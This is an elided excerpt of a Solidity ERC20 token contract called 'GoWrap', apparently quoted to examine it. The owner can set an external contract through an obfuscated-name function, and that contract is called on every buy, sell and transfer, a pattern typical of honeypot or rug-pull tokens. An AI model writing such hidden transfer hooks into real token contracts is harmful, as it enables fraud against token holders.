...
contract TokenM is ERC20 {
    ...
    IUserAmountnifruu public nifruu;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("GoWrap", "GW") {
    ...
    function crooerliBningsRvvu(IUserAmountnifruu _nifruu) public onlyOwner {
        nifruu = _nifruu;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                nifruu.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				nifruu.addOutAmount(from, amount);
            }else{
                nifruu.addOutAmount(from, amount);
                takeFee = false;
            }
